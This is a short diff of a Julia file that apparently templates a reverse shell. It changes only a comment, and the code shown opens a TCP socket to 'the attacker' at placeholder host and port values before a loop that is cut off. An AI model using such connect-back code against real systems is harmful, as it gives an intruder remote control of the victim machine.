@@ -1,6 +1,6 @@
 using Sockets
 
-# Open a new socket and connect to the attacker
+# Open a new TCP socket and connect to the attacker
 sock = connect("^\host^", parse(Int64, "^\port^"))
 
 while true
